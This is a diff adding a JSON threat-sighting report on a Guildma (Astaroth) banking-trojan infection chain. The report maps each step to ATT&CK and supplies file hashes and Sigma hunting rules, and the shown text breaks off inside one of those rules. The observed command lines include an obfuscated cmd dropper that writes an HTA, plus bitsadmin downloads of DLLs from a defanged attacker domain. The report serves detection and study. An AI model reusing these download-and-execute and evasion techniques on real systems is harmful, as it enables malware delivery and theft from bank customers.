@@ -1,0 +1,929 @@
+{
+  "header": {
+    "sightingReportId": "00e1906f-5c50-427c-8e68-bbb6565c3f44",
+    "status": "wip",
+    "description": "Guildma (a.k.a Astaroth) is a banking trojan observed mostly on LATAM, Spain and Portugal. The main focus of the actor is the financial sector. In this Threat Sighting Guildma was downloaded using a complex chain of PowerShell, CMD, MSHTA, BITSadmin and loaded into memory via a malicious AutoIt3 script.",
+    "author": "Jose Luis Sanchez Martinez (@Joseliyo_Jstnk)",
+    "acknowledgement": "Kimberly - @StopMalvertisin",
+    "tlp": "white",
+    "threatInformation": {
+      "adversaries": [
+        "LATAM Actor"
+      ],
+      "malware": [
+        "Guildma"
+      ],
+      "tools": [
+        "powershell.exe",
+        "winrar.exe",
+        "timeout.exe",
+        "AutoIt3"
+      ],
+      "lolbas": [
+        "bitsadmin.exe",
+        "cmd.exe",
+        "dllhost.exe",
+        "mshta.exe"
+      ],
+      "regions": [
+        {
+          "Latin America": [
+            "Brazil"
+          ]
+        },
+        {
+          "Southern Europe": [
+            "Portugal",
+            "Spain"
+          ]
+        }
+      ],
+      "industries": [
+        "financial sector"
+      ]
+    }
+  },
+  "threatSightings": [
+    {
+      "sighting": "Execution - Threat Actor used malicious _ZIP_ file to lure users for Initial Access.",
+      "id": "711f791f-df1f-4d2a-8dc0-4dc4a9aba5c2",
+      "behaviors": [
+        {
+          "behavior": "Victim decompressed the malicious ZIP file.",
+          "type": "Process Created",
+          "id": "c69e353e-884f-4e85-b879-78ec62531e9e",
+          "weapon": "winrar",
+          "processes": [
+            {
+              "process": "C:\\\\Program Files\\\\WinRAR\\\\WinRAR.exe",
+              "cmdLine": [
+                "\"C:\\\\Program Files\\\\WinRAR\\\\WinRAR.exe\" \"C:\\\\Users\\\\#{user}\\\\Desktop\\\\TUP32980638916Y.zip\""
+              ]
+            }
+          ],
+          "att&ck": {
+            "execution": [
+              "T1204.002 - User Execution: Malicious File"
+            ]
+          }
+        },
+        {
+          "behavior": "12 files were dropped into Temp path (included a masqueraded copy of AutoIt3 script interpreter).",
+          "type": "File Created",
+          "id": "2415d026-bbf4-4005-90f4-aee59585fb9c",
+          "weapon": "winrar",
+          "files": [
+            {
+              "path": "C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Rar$DRa2672.2359\\\\TUP32980638916Y\\\\359168.783.30258.81261_857.62608.08524.zip",
+              "name": "359168.783.30258.81261_857.62608.08524.zip",
+              "sha256": "708a687ac41584ea1d8d567334ce441a5214aaa601c1a6214475144abbbd72fe",
+              "process": "C:\\\\Program Files\\\\WinRAR\\\\WinRAR.exe"
+            },
+            {
+              "path": "C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Rar$DRa2672.2359\\\\TUP32980638916Y\\\\599151.301.25077.7868139..zip",
+              "name": "599151.301.25077.7868139..zip",
+              "sha256": "a49e20c8211e8f4268b0b5c13b4f1d70a0b74dc24e8a08a857cd2b1ff4ad4c3f",
+              "process": "C:\\\\Program Files\\\\WinRAR\\\\WinRAR.exe"
+            },
+            {
+              "path": "C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Rar$DRa2672.2359\\\\TUP32980638916Y\\\\599151.301.25077.7868139.LNK",
+              "name": "599151.301.25077.7868139.LNK",
+              "sha256": "7ae01fd7aa0b5898eb36548024f2cc8156216322ea6402eb8f04180adfc9539d",
+              "process": "C:\\\\Program Files\\\\WinRAR\\\\WinRAR.exe"
+            },
+            {
+              "path": "C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Rar$DRa2672.2359\\\\TUP32980638916Y\\\\ctfmon-dll-decoded.dll",
+              "name": "ctfmon-dll-decoded.dll",
+              "sha256": "4af123558afa33de6944a4766fc63c6ed31b661cda5a1162f89e8f1edec0b0fa",
+              "process": "C:\\\\Program Files\\\\WinRAR\\\\WinRAR.exe"
+            },
+            {
+              "path": "C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Rar$DRa2672.2359\\\\TUP32980638916Y\\\\ctfmon.dll",
+              "name": "ctfmon.dll",
+              "sha256": "68607e0043c83b83ab6653476ef90aff1d42812e2a6cf7e39149a551f63efb36",
+              "process": "C:\\\\Program Files\\\\WinRAR\\\\WinRAR.exe"
+            },
+            {
+              "path": "C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Rar$DRa2672.2359\\\\TUP32980638916Y\\\\ctfmon.exe",
+              "name": "ctfmon.exe",
+              "sha256": "237d1bca6e056df5bb16a1216a434634109478f882d3b1d58344c801d184f95d",
+              "process": "C:\\\\Program Files\\\\WinRAR\\\\WinRAR.exe"
+            },
+            {
+              "path": "C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Rar$DRa2672.2359\\\\TUP32980638916Y\\\\ctfmon.log",
+              "name": "ctfmon.log",
+              "sha256": "7230956f4c915842cc3985174a1b05906ef53308a4ae0755ca9ecc96fe400df8",
+              "process": "C:\\\\Program Files\\\\WinRAR\\\\WinRAR.exe"
+            },
+            {
+              "path": "C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Rar$DRa2672.2359\\\\TUP32980638916Y\\\\ctfmon1.exe",
+              "name": "ctfmon1.exe",
+              "sha256": "7d361e62e333b2ed467505025fd04c75b63c6aca9b15dad6f76adc8bd1deadbd",
+              "process": "C:\\\\Program Files\\\\WinRAR\\\\WinRAR.exe"
+            },
+            {
+              "path": "C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Rar$DRa2672.2359\\\\TUP32980638916Y\\\\ctfmon1_.au3",
+              "name": "ctfmon1_.au3",
+              "sha256": "0f977614e29c69399e36c2adab87e671c132b371f61bad3a876a2c5165872e88",
+              "process": "C:\\\\Program Files\\\\WinRAR\\\\WinRAR.exe"
+            },
+            {
+              "path": "C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Rar$DRa2672.2359\\\\TUP32980638916Y\\\\log32.dll",
+              "name": "log32.dll",
+              "sha256": "a468044a374a872732928cf9f1814b7e26dab28e381ca43a8ccfa54a2c67eeae",
+              "process": "C:\\\\Program Files\\\\WinRAR\\\\WinRAR.exe"
+            },
+            {
+              "path": "C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\Rar$DRa2672.2359\\\\TUP32980638916Y\\\\r1.log",
+              "name": "r1.log",
+              "sha256": "f590d42dc419347216b5ff37e6ff157ba574c8bb6ef83a9dc21672f254e612be",
+              "process": "C:\\\\Program Files\\\\WinRAR\\\\WinRAR.exe"
+            }
+          ],
+          "notes": [
+            "AutoIt3 script interpreter in masqueraded as 'ctfmon.exe'",
+            "The LNK file is the first-stage payload"
+          ]
+        }
+      ]
+    },
+    {
+      "sighting": "Initial Access - Threat Actor used malicious _.LNK_ file to lure users for Execution.",
+      "id": "345f791f-df1f-4d2a-8dc0-4dc4a9aba514",
+      "behaviors": [
+        {
+          "behavior": "User executed a _.LNK_ file contained in the _ZIP_ file.",
+          "type": "Process Created",
+          "id": "e84b834b-da02-4ccf-95e2-ae10303f6224",
+          "weapon": "explorer",
+          "processes": [
+            {
+              "process": "C:\\\\Windows\\\\explorer.exe",
+              "cmdLine": [
+                "C:\\Users\\#{user}\\AppData\\Local\\Temp\\Rar$DRa2672.2359\\TUP32980638916Y\\599151.301.25077.7868139.LNK"
+              ]
+            }
+          ],
+          "att&ck": {
+            "execution": [
+              "T1204.002 - User Execution: Malicious File"
+            ]
+          }
+        },
+        {
+          "behavior": "_.LNK_ file triggered _CMD.exe_ with obfuscated command-line",
+          "type": "Process Created",
+          "id": "6f790153-8951-4a5d-b28c-32f7d4f666c3",
+          "weapon": "cmd",
+          "processes": [
+            {
+              "process": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+              "parentProcess": "C:\\\\Windows\\\\explorer.exe",
+              "cmdLine": [
+                "\\\"C:\\\\Windows\\\\System32\\\\cmd.exe\\\" /V/D/c \\\"seT sKk=script&&seT px=powershell&&SEt NEGG=C:\\\\Users\\\\Public\\\\Videos\\\\^YqW&&SEt SMO=.H&&SEt XQGZ=^<!sKk!^>try{v6POar c=\\'!sKk!:\\';d=\\'h6POTtP:\\';G6POetObj6POect(c+d+\\'&&sET FIC=ZXEFMZXEFMwaa8.nolii.dateZXEFM?1ZXEFM\\');}catch(e){}close();^</!sKk!^>&&sEt/^p YE8N=\\\"%XQGZ:6PO=%%FIC:ZXEFM=/%\\\"<nul > %NEGG%%SMO%ta\\|!px! -Command \\\"& \\'!NEGG!!SMO!ta\\' \\\""
+              ]
+            }
+          ],
+          "notes": [
+            "The command line establishes different variables (sKk, px, NEGG, SMO, XQGZ, FIC, YE8N) to execute a command"
+          ],
+          "att&ck": {
+            "execution": [
+              "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "sighting": "Execution - Threat Actor used _CMD_ to run obfuscated command that drops _HTA_ file for Defense Evasion.",
+      "id": "abc1291f-df1f-4d2a-8dc0-4dc4a9aba512",
+      "behaviors": [
+        {
+          "behavior": "_CMD.exe_ spawned with an obfuscated command-line",
+          "type": "Process Created",
+          "id": "31978031-2df2-411d-92c6-0b8811b92410",
+          "weapon": "cmd",
+          "processes": [
+            {
+              "process": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+              "parentProcess": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+              "cmdLine": [
+                "C:\\Windows\\system32\\cmd.exe  /S /D /c\\\" sEt/p YE8N=\\\"%XQGZ:6PO=%%FIC:ZXEFM=/%\\\" 0<nul 1>%NEGG%%SMO%ta\\\""
+              ]
+            }
+          ],
+          "notes": [
+            "This process creates a file in the path Videos of the user Public of the system."
+          ],
+          "att&ck": {
+            "execution": [
+              "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+            ]
+          }
+        },
+        {
+          "behavior": ".hta file is created under C:\\\\Users\\\\Public\\\\Videos folder",
+          "type": "File Created",
+          "id": "c5858702-304e-4cac-b8f0-5e1a59fd8f14",
+          "weapon": "cmd",
+          "files": [
+            {
+              "path": "C:\\\\Users\\\\Public\\\\Videos\\\\YqW.Hta",
+              "process": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+              "name": "YqW.Hta",
+              "sha256": "c43738a850d1ae9d59f39d592cdc3faca6a327735dbaaa9c979b5036dba72937"
+            }
+          ],
+          "notes": [
+            "This file includes the URL where the malware will connect to download next stages payloads.",
+            "An HTML Application (HTA) is a Microsoft Windows program whose source code consists of HTML, Dynamic HTML, and one or more scripting languages supported by Internet Explorer, such as VBScript or JScript"
+          ],
+          "att&ck": {
+            "execution": [
+              "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "sighting": "Execution - Threat Actor used _PowerShell_ to execute _HTA_ payload via _MSHTA_ for Defense Evasion.",
+      "id": "405f6dac-423e-4932-80dc-61e6701e648b",
+      "behaviors": [
+        {
+          "behavior": "PowerShell command executed to load malicious .hta file",
+          "type": "Process Created",
+          "id": "12deddfd-3f53-44c2-9ec6-f86bac5508be",
+          "weapon": "powershell",
+          "processes": [
+            {
+              "parentProcess": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+              "process": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+              "cmdLine": [
+                "powershell  -Command \"& 'C:\\Users\\Public\\Videos\\YqW.Hta' "
+              ]
+            }
+          ],
+          "att&ck": {
+            "execution": [
+              "T1059.001 - Command and Scripting Interpreter: PowerShell"
+            ]
+          }
+        },
+        {
+          "behavior": "mshta.exe is loaded to run the HTA script",
+          "type": "Process Created",
+          "id": "97bb52c8-97a1-4881-84a1-3f3dd1e22a29",
+          "weapon": "mshta",
+          "processes": [
+            {
+              "parentProcess": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+              "process": "C:\\\\Windows\\\\System32\\\\mshta.exe",
+              "cmdLine": [
+                "\"C:\\\\Windows\\\\System32\\\\mshta.exe\" \"C:\\\\Users\\\\Public\\\\Videos\\\\YqW.Hta\""
+              ]
+            }
+          ],
+          "notes": [
+            "This execution triggers different events in the system like Network and File events."
+          ],
+          "att&ck": {
+            "defenseEvasion": [
+              "T1218.005 - Signed Binary Proxy Execution: Mshta"
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "sighting": "Execution - Threat Actor used _MSHTA_ to orchestrate the download of Guildma DLL and other artifacts via _BITSadmin_ for Command And Control.",
+      "id": "123f6dac-423e-4932-80dc-61e6701e648b",
+      "behaviors": [
+        {
+          "behavior": "MSHTA connects to C2 server to download files and execute additional malware",
+          "id": "1e64609c-5125-4e4a-9ad0-e0e1a5dcd240",
+          "type": "Network Accessed",
+          "weapon": "mshta",
+          "connections": [
+            {
+              "protocol": "tcp",
+              "method": "GET",
+              "dstPort": 80,
+              "direction": "outbound",
+              "dstIp": "104.21.76[.]96",
+              "dstHost": "http://waa8.nolii[.]date/?1/",
+              "userAgent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
+              "process": "C:\\\\Windows\\\\System32\\\\mshta.exe"
+            }
+          ],
+          "notes": [
+            "The cookie 'cidade' is established in the first response of the C2. The value will be different for each intrusion. One of the observed is the following -> 'set-cookie: cidade=CFXX;'"
+          ],
+          "att&ck": {
+            "commandAndControl": [
+              "T1071.001 - Application Layer Protocol: Web Protocols"
+            ]
+          }
+        },
+        {
+          "behavior": "bitsadmin.exe is spawned by MSHTA to download Guildma DLL",
+          "type": "Process Created",
+          "id": "4d397821-7cdd-4c3e-85be-5fcb196e8652",
+          "weapon": "bitsadmin",
+          "processes": [
+            {
+              "parentProcess": "C:\\\\Windows\\\\System32\\\\mshta.exe",
+              "process": "C:\\\\Windows\\\\System32\\\\bitsadmin.exe",
+              "cmdLine": [
+                "\"C:\\\\Windows\\\\System32\\\\bitsadmin.exe\" /transfer 46591720728 /priority foreground http://weta950iitv.keorgia[.]life/?530802004483151908759951449945921 \"C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\\\ctfmon.dll\""
+              ]
+            }
+          ],
+          "notes": [
+            "The content of the file is 'C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\\\'"
+          ],
+          "att&ck": {
+            "commandAndControl": [
+              "T1105 - Ingress Tool Transfer"
+            ]
+          }
+        },
+        {
+          "behavior": "Multiple text files are created by MSHTA after the HTA file execution",
+          "type": "File Created",
+          "id": "db7423fd-d058-4768-9fe3-4a6ff4654c39",
+          "weapon": "mshta",
+          "files": [
+            {
+              "path": "C:\\\\Users\\\\#{user}\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Cookies\\\\HE6VS7YU.txt",
+              "name": "HE6VS7YU.txt",
+              "sha256": "1caa6af47e4db7bf1da8e6c49195ae238be282122a0196bd5abc4fc49fe4fc96",
+              "process": "C:\\\\Windows\\\\System32\\\\mshta.exe"
+            },
+            {
+              "path": "C:\\\\Users\\\\#{user}\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Cookies\\\\XJHKVD2B.txt",
+              "name": "XJHKVD2B.txt",
+              "sha256": "2786ace6c24c5bfe3217f9babbe9146a17ff3210c49f51f9eb73a615ca866cff",
+              "process": "C:\\\\Windows\\\\System32\\\\mshta.exe"
+            },
+            {
+              "path": "C:\\\\Users\\\\#{user}\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Cookies\\\\3JVKRLFN.txt",
+              "name": "3JVKRLFN.txt",
+              "sha256": "2f71a4e7c3177c328e56daff9b4665541b198a539c25873bbfa746e22968c22e",
+              "process": "C:\\\\Windows\\\\System32\\\\mshta.exe"
+            },
+            {
+              "path": "C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\Temporary Internet Files\\\\Content.IE5\\\\BDW1XBVN\\\\0KG1IQBM.htm",
+              "name": "0KG1IQBM.htm",
+              "sha256": "2c646225ab4da6090ef51aa488135a4d2edc077071ebe9e173dde9d0eb43b0b7",
+              "process": "C:\\\\Windows\\\\System32\\\\mshta.exe"
+            }
+          ],
+          "notes": [
+            "The content of the files saved in the Cookies path, is related to the values of the cookie in each response of the C2 (country, domain, etc.)",
+            "The .htm file is the content of the server when the request was made by the mstha process.",
+            "When mstha.exe is executed, a copy of the website visited is saved in the system with .htm extension."
+          ],
+          "att&ck": {
+            "defenseEvasion": [
+              "T1218.005 - Signed Binary Proxy Execution: Mshta"
+            ]
+          }
+        },
+        {
+          "behavior": "MSHTA spawned multiple instances of bitsadmin.exe to download files",
+          "type": "Process Created",
+          "id": "6b981fdf-ba8d-4e19-a437-662d672f627c",
+          "weapon": "bitsadmin",
+          "processes": [
+            {
+              "parentProcess": "C:\\\\Windows\\\\System32\\\\mshta.exe",
+              "process": "C:\\\\Windows\\\\System32\\\\bitsadmin.exe",
+              "cmdLine": [
+                "\"C:\\Windows\\System32\\bitsadmin.exe\" /transfer 59697582645 /priority foreground http://weta950iitv.keorgia[.]life/?49547426338677879 \"C:\\Users\\Public\\Videos\\VEO46570203888O\\log32.dll\"",
+                "\"C:\\Windows\\System32\\bitsadmin.exe\" /transfer 32546684239 /priority foreground http://weta950iitv.keorgia[.]life/?54819973696676725 \"C:\\Users\\Public\\Videos\\VEO46570203888O\\log33.dll\"",
+                "\"C:\\Windows\\System32\\bitsadmin.exe\" /transfer 23219779590 /priority foreground http://weta950iitv.keorgia[.]life/?69413452047686482 \"C:\\Users\\Public\\Videos\\VEO46570203888O\\ctfmon.exe\"",
+                "\"C:\\Windows\\System32\\bitsadmin.exe\" /transfer 39693815612 /priority foreground http://weta950iitv.keorgia[.]life/?56006860532636958 \"C:\\Users\\Public\\Videos\\VEO46570203888O\\ctfmon.log\""
+              ]
+            }
+          ],
+          "notes": [
+            "4 different process of bitsadmin are spawned by mshta."
+          ],
+          "att&ck": {
+            "defenseEvasion": [
+              "T1197 - BITS Jobs"
+            ]
+          }
+        },
+        {
+          "behavior": "CMD.exe is launched by mshta.exe to write content into a file",
+          "type": "Process Created",
+          "id": "1e61fe01-87c1-4c83-8085-23f46da2694e",
+          "weapon": "cmd",
+          "processes": [
+            {
+              "parentProcess": "C:\\\\Windows\\\\System32\\\\mshta.exe",
+              "process": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+              "cmdLine": [
+                "\"C:\\\\Windows\\\\System32\\\\cmd.exe\" /V /C \"echo C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\>C:\\\\Users\\\\Public\\\\lu\"&& exit"
+              ]
+            }
+          ],
+          "notes": [
+            "Dumps the content of the echo parameter into the file called 'lu'"
+          ],
+          "att&ck": {
+            "execution": [
+              "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+            ]
+          }
+        },
+        {
+          "behavior": "CMD.exe creates a file called lu (likely an internal flag used by the malware)",
+          "type": "File Created",
+          "id": "e3379b96-037b-4030-bd67-2ff41f69ce43",
+          "weapon": "cmd",
+          "files": [
+            {
+              "path": "C:\\\\Users\\\\Public\\\\lu",
+              "name": "lu",
+              "process": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+              "sha256": "0d2b76c81f71697da861526aa672493b557f1480077dfde77a717a1cd69417d9"
+            }
+          ],
+          "notes": [
+            "The content of the file is 'C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\\\'"
+          ],
+          "att&ck": {
+            "execution": [
+              "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "sighting": "Execution - Threat Actor used _MSHTA_ to launch a _PowerShell_ command that loads Guildma DLL for Defense Evasion.",
+      "id": "e201b5e8-d1f3-4fd8-b72d-6404c25d50e7",
+      "behaviors": [
+        {
+          "behavior": "Another CMD.exe is spawned by mshta.exe to execute PowerShell.exe",
+          "type": "Process Created",
+          "id": "60387339-a661-41ba-aa8e-3644e16b91e9",
+          "weapon": "cmd",
+          "processes": [
+            {
+              "parentProcess": "C:\\\\Windows\\\\System32\\\\mshta.exe",
+              "process": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+              "cmdLine": [
+                "\"C:\\\\Windows\\\\System32\\\\cmd.exe\" /c cd C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\&& ^start ^/W ^/MIN powershell -windowstyle hidden -Command \"& \"C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\\\ctfmon.exe\" C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\\\ctfmon.log \"&& timeout 3600"
+              ]
+            }
+          ],
+          "notes": [
+            "This CMD.exe is executed at the same time of bitsadmin.exe. Both are child process of mshta (possibly ADS)",
+            "Alternate Data Stream (ADS) is the ability of an NTFS file system (the main file system format in Windows) to store different streams of data, in addition to the default stream which is normally used for a file."
+          ],
+          "att&ck": {
+            "execution": [
+              "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "sighting": "Execution - Threat Actor used _PowerShell_ to launch _AutoIt3_ script for Defense Evasion.",
+      "id": "4561b5e8-d1f3-4fd8-b72d-6404c25d45e7",
+      "behaviors": [
+        {
+          "behavior": "PowerShell.exe is spawned by cmd.exe to execute the _AutoIt3_ binary",
+          "type": "Process Created",
+          "id": "8f8d88d8-b0d9-4e4d-a680-5b4ee115f886",
+          "weapon": "powershell",
+          "processes": [
+            {
+              "parentProcess": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+              "process": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+              "cmdLine": [
+                "powershell  -windowstyle hidden -Command \"& \"C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\\\ctfmon.exe\" \"C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\\\ctfmon.log\" && timeout 3600\""
+              ]
+            }
+          ],
+          "notes": [
+            "ctfmon.exe is the legit binary of AutoIt3."
+          ],
+          "att&ck": {
+            "execution": [
+              "T1059.001 - Command and Scripting Interpreter: PowerShell"
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "sighting": "Execution - Threat Actor used a renamed copy of _AutoIt3_ interpreter to run malicious _AutoIt3_ scripts to launch Guildma DLL for Execution.",
+      "id": "2341b5e8-d1f3-4fd8-b72d-6404c25d9537",
+      "behaviors": [
+        {
+          "behavior": "Renamed copy of _AutoIt3_ interpreter (ctfmon.exe) is executed to load the _AutoIt3_ script (ctfmon.log)",
+          "type": "Process Created",
+          "id": "0d7c0ec5-a9fc-4970-a7f4-605c76126afb",
+          "weapon": "AutoIt3",
+          "processes": [
+            {
+              "parentProcess": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+              "process": "C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\\\ctfmon.exe",
+              "embedFilename": "AutoIt3.exe",
+              "cmdLine": [
+                "\"C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\\\ctfmon.exe\"  C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\\\ctfmon.log"
+              ]
+            }
+          ],
+          "att&ck": {
+            "execution": [
+              "T1059 - Command and Scripting Interpreter"
+            ],
+            "defenseEvasion": [
+              "T1036 - Masquerading"
+            ]
+          },
+          "notes": [
+            "The binary of _AutoIt3_ is executed to load the _AutoIt3_ script, which is responsible for loading the Guildma DLL afterwards"
+          ]
+        }
+      ]
+    },
+    {
+      "sighting": "Execution - Threat Actor used _AutoIt3_ scripts to launch _Guildma DLL_ for Execution.",
+      "id": "9991b5e8-d1f3-4fd8-b72d-6404c25d95e7",
+      "behaviors": [
+        {
+          "behavior": "Dllhost.exe is launched by the _AutoIt3_ interpreter.",
+          "type": "Process Created",
+          "id": "5ae3577c-ddbd-4327-ae97-9f3cab9de359",
+          "weapon": "dllhost",
+          "processes": [
+            {
+              "parentProcess": "C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\\\ctfmon.exe",
+              "process": "C:\\\\Windows\\\\System32\\\\dllhost.exe",
+              "cmdLine": [
+                "C:\\Windows\\System32\\dllhost.exe"
+              ]
+            }
+          ],
+          "notes": [
+            "Maybe the content of the DLL is loaded in memory under this process."
+          ],
+          "att&ck": {
+            "defenseEvasion": [
+              "T1059 - Command and Scripting Interpreter"
+            ]
+          }
+        },
+        {
+          "behavior": "Timeout.exe is launched by CMD.exe",
+          "type": "Process Created",
+          "id": "ddd41cba-09f1-440f-9ea2-1a1553d890f2",
+          "weapon": "timeout",
+          "processes": [
+            {
+              "parentProcess": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+              "process": "C:\\\\Windows\\\\System32\\\\timeout.exe",
+              "cmdLine": [
+                "timeout  3600"
+              ]
+            }
+          ],
+          "notes": [
+            "Timeout binary pauses the command processor for the specified number of seconds.",
+            "3600 seconds is 60 minutes"
+          ],
+          "att&ck": {
+            "defenseEvasion": [
+              "T1497.003 - Virtualization/Sandbox Evasion: Time Based Evasion"
+            ]
+          }
+        },
+        {
+          "behavior": "CMD.exe is spawned by mshta.exe to create another file in C:\\\\Users\\\\Public\\\\Videos file",
+          "type": "Process Created",
+          "id": "8de26a3a-a98c-4752-aa59-f28607cbb3d3",
+          "weapon": "cmd",
+          "processes": [
+            {
+              "parentProcess": "C:\\\\Windows\\\\System32\\\\mshta.exe",
+              "process": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+              "cmdLine": [
+                "\"C:\\Windows\\System32\\cmd.exe\" /V /C \"echo gharobhnpuluguaoqzgezkk >C:\\Users\\Public\\Videos\\VEO46570203888O\\\\r1.log\"&& exit"
+              ]
+            }
+          ],
+          "notes": [
+            "The content of the file r1.log is 'gharobhnpuluguaoqzgezkk'"
+          ],
+          "att&ck": {
+            "execution": [
+              "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+            ]
+          }
+        },
+        {
+          "behavior": "CMD.exe creates a file called r1.log",
+          "type": "File Created",
+          "id": "a281776e-073d-4207-b957-be3dba343050",
+          "weapon": "cmd",
+          "files": [
+            {
+              "path": "C:\\\\Users\\\\Public\\\\Videos\\\\VEO46570203888O\\\\r1.log",
+              "name": "r1.log",
+              "process": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+              "sha256": "4e9024af1b08626242d7d89856adff548d542930660d168595b72187af4d086e"
+            }
+          ],
+          "notes": [
+            "The content of the file r1.log is 'gharobhnpuluguaoqzgezkk'"
+          ],
+          "att&ck": {
+            "execution": [
+              "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+            ]
+          }
+        }
+      ]
+    }
+  ],
+  "threatHunting": [
+    {
+      "query": "Hunt for AutoIt3.exe script interpreter execution via PowerShell",
+      "queryId": "cc87fb86-1850-4f21-9487-1aaa29835cb7",
+      "type": "sigma",
+      "behaviorIds": [
+        "0d7c0ec5-a9fc-4970-a7f4-605c76126afb"
+      ],
+      "logsource": {
+        "category": "process_creation",
+        "product": "windows"
+      },
+      "detection": {
+        "selection2": {
+          "ParentImage|endswith": [
+            "\\\\powershell.exe"
+          ]
+        },
+        "selection3": {
+          "OriginalFileName": "AutoIt3.exe"
+        },
+        "condition": "all of them"
+      }
+    },
+    {
+      "query": "Hunt for bitsadmin.exe execution through mshta.exe as a parent",
+      "queryId": "55c886e7-656d-47ab-9aa9-f477dc7698c7",
+      "type": "sigma",
+      "behaviorIds": [
+        "4d397821-7cdd-4c3e-85be-5fcb196e8652"
+      ],
+      "logsource": {
+        "category": "process_creation",
+        "product": "windows"
+      },
+      "detection": {
+        "selection": {
+          "Image|endswith": [
+            "\\\\bitsadmin.exe"
+          ]
+        },
+        "selection2": {
+          "ParentImage|endswith": [
+            "\\\\mshta.exe"
+          ]
+        },
+        "selection3": {
+          "commandLine|contains|all": [
+            "/transfer",
+            "/download",
+            "http"
+          ]
+        },
+        "condition": "all of them"
+      }
+    },
+    {
+      "query": "Hunt suspicious bitsadmin.exe execution",
+      "queryId": "d4cbd26d-a82d-48f4-92e2-e94c9110de47",
+      "type": "sigma",
+      "behaviorIds": [
+        "4d397821-7cdd-4c3e-85be-5fcb196e8652",
+        "6b981fdf-ba8d-4e19-a437-662d672f627c"
+      ],
+      "link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/win_process_creation_bitsadmin_download.yml"
+    },
+    {
+      "query": "Hunt for suspicious files generated by mshta in specifics folders",
+      "queryId": "c9f8f1a9-b8c9-45fa-9e7d-ee5e4778c4db",
+      "type": "sigma",
+      "behaviorIds": [
+        "db7423fd-d058-4768-9fe3-4a6ff4654c39"
+      ],
+      "logsource": {
+        "category": "file_event",
+        "product": "windows"
+      },
+      "detection": {
+        "selection": {
+          "TargetFilename|contains": "\\AppData\\Roaming\\Microsoft\\Windows\\Cookies\\",
+          "TargetFilename|endswith": ".txt"
+        },
+        "condition": "selection"
+      }
+    },
+    {
+      "query": "Hunt for cmd execution with variables observed during this intrusion of Guildma",
+      "queryId": "756f066c-e426-4e51-a2e6-9c6396bab686",
+      "type": "sigma",
+      "behaviorIds": [
+        "6f790153-8951-4a5d-b28c-32f7d4f666c3"
+      ],
+      "logsource": {
+        "category": "process_creation",
+        "product": "windows"
+      },
+      "detection": {
+        "selection": {
+          "Image|endswith": [
+            "\\\\cmd.exe"
+          ],
+          "commandLine|contains|all": [
+            "sKk=",
+            "px=",
+            "NEGG=",
+            "SMO=",
+            "XQGZ=",
